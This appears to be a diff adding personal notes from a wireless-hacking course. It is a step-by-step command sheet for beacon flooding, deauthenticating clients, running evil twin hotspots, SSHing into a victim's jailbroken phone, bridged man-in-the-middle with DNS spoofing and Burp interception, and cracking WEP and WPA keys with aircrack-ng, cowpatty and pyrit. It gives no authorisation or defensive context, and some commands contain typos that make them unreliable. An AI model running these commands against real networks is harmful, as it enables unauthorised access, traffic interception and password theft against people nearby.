@@ -1,0 +1,166 @@
+cd /pentest/wireless/mdk3
+
+./mdk3 wlan0mon b -n Pwned     //  b--> beacon flood
+
+aireplay-ng --deauth 0 -a as:Ad:Ad:AD:AD wlan0mon        ///deauthenticates all clients connencted to certain access point
+
+For fake authentication
+aireplay-ng --fakeauth 10 -e KU-WL -h as:Ad:Ad:AD:AD mon0
+
+
+To hack wlan with wep encryption and ska authentication method
+
+first of all deauthenticate anyone connected to your targeted access point
+airodump-ng --channel 1 mon0 --bssid 01:12:12:12:12 --write asd   //it will write into asd.cap file all authentication process which include challenge text, enxrypted text with initialization vector and response for successfull authentication.
+
+aireplay-ng --fakeauth 10 -e KU-WL  -y demo-01:12:12:12:12.xor mon0  // where -y parameter is the xor file which is the keystream sent by the client
+
+
+A device is normally connected to many access point but when it is isolated it keep sending probe requests for certain ESSID
+This line creates hotpost with ssid of ku-wl
+airbase-ng --essid KU-WL -a AA:AA:AA:AA:AA:AA mon0
+This server creates hotspot with -P for responding to all probe requests and -V verbose to display all details and -C to set delay time in which to reply to the connected client
+airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA mon0 -v
+
+tail -f /var/log/messages to read kernel messages
+iw reg set US to set the regulatory domain in which you are working....you can set any country and so base on it you will be provided the transmitting power or radiating power of the wireless router or modem.
+ iwconfig wlan0 txpower 30 to set the transmitting power
+
+
+
+Creating evil twin hotspot..:D
+
+airbase-ng -a AA:AA:AA:AA:AA:AA -e KU-WL mon0
+ifconfig at0 up
+Here 169.123.123.123 is the client IP address which you can get from wireshark captures which you disconnected from the authorized access point and connected to your evil twin.When it's requesting for DHCP, it'll broadcast its IP address above red bars and then you can fetch its IP address.
+
+ifconfig at0 169.123.123.123 netmask 255.255.255.0 up
+ping 169.123.123.123 to check connectivity
+ssh 169.123.123.123 to get into mobile if it was jail broken....:D :D :D
+
+
+
+
+Man in the middle attack
+
+To bridge the connection between your victim interface and your internet connected interface.
+
+brctl addbr mitm
+To connect this bridge mitm to eth0 -    brctl addif mitm eth0
+To connect this bridge mitm to at0   -    brctl addif mitm at0
+ifconfig eth0 0.0.0.0 up to assign ip address
+ifconfig at0 0.0.0.0 up
+
+ifconfig mitm up
+
+To assign ip address to this mitm bridge interface (optional)
+
+dhclient3 mitm &
+
+So now,disconnect your victim from the authorized access point and connect to yourself at at0. So net will be provided through eth0 interface bridging.Then you can sniff using wireshark at at0 interface.
+
+
+
+SSL MITM Attack
+
+Contnuing from the last steps, create a DNS spoof to respond to dns request of client.For eg.  if client requests for google.com, you'll reply with an IP address of hacker, where client will think it is of google.
+
+dnsspoof -i mitm to listen on mitm interface
+
+Open Burpsuite proxy
+Then add 2 more ports 80 and 443 for listening the traffic as client sends all the traffic to port 80 of hacker machine.
+And check for the invisible proxy for non aware proxy clients.And then you can intercept and forward data and grab data.
+
+
+
+
+
+
+
+Cracking WEP Key
+
+We will start reading the packets between client and AP and write into a file adf.cap
+If you want to crack a WEP key, we will look for weak Initialization Vector IVs in thousands.First of all we will deauthenticate the client from authorized access point so that we can obtain any ARP packet.	
+
+aireplay-ng --arpreplay -e PwnMe -h CC:CC:CC:CC:CC:CC 
+This sends ARP requests and if you get a response from AP you are successfull which can be seen by large no. of data packets send by AP in its column.Then aircrack the file
+
+aircrack-ng adf.cap
+
+After collecting enough number of keys, it will finally crack the key.
+
+Cracking WEP  key:  Caffe Latte Attack
+
+Use airodump-ng to store and write details into .cap file by monitoring the air for that specific WEP connection.
+
+airbase-ng -c 1 --essid PwnMe mon0 -W 1 -L -x 10(could me more for faster process)
+
+As Caffe Latte Attack proceeds, data packets increase as it sends more ARP packets to the connection.	
+
+Then aircrack the file to get the WEP key....
+
+Decrypting packets without knowing WEP key..Korek Chopchop attack
+
+aireplay-ng --chopchop -e PwnMe mon0
+
+This attack first of all chops the last byte of the packet, and guesses it plain text value and send it back to AP.If it is right it is decrypted else it takes another guess. This process  is repeated until the whole packet is decrypted. Then the decrypted plain text packet is saved in one file and keystream in another file.
+
+Hirte Attack
+
+Use airodump-ng to store and write details into .cap file by monitoring the air for that specific WEP connection.
+
+airebase-ng -c 1 -essid  PwnMe -W 1 mon0 -N where N stands for Hirte Attack
+
+
+
+
+
+
+
+WPA Cracking Based on dictionary attack:
+
+First of all store all details into .cap file. And then aircrack it
+
+aircrack-ng asd.cap -w asdas.lst
+
+Speeding Up cracking process by pre-calculating all PMKs before..
+
+genpmk -f dict -s dlink -d CalcultaingPMKs                 //This will use common ssids and passwds to form a list of PMKs 	
+
+Now using cowpatty to crack the password
+
+cowpatty -d CalcultaingPMKs -s dlink -r wadaw.cap
+
+pyrit -r wadaw.cap analyze just analyzes the .cap file and returns its details....
+
+
+To crack the password with another method using pyrit
+
+pyrit -r wadaw.cap -i CalcultaingPMKs attack_cowpatty
+
+Aircrack cannot directly crack the PMK file but airolib can convert the cowpatty file to suitable one...
+
+airolib-ng PMK-Airolib --import cowpatty CalcultaingPMKs
+So converted file is PMK-Airolib which gives an sqlite file...
+
+aircrack-ng -r PMK-Airolib wadaw.cap will crack the password. These are 3 methods in cracking the WPA password in speeding WPA cracking method.
+
+
+
+
+
+Using wpa_supplicant to connect  to WPA connection
+
+Download wpa .conf configuration file and set all the details as specified in video 28-37 
+
+wpa_supplicant -Dwext  -iwlan0 -c wpa-psk.conf 
+
+This will connect if the passphase in the .conf file is correct....:) :) :D
+
+wpa_supplicant -Dwext  -iwlan0 -c wpa-psk.conf -dd -K -t for more detailed info
+
+
+
+
+
+
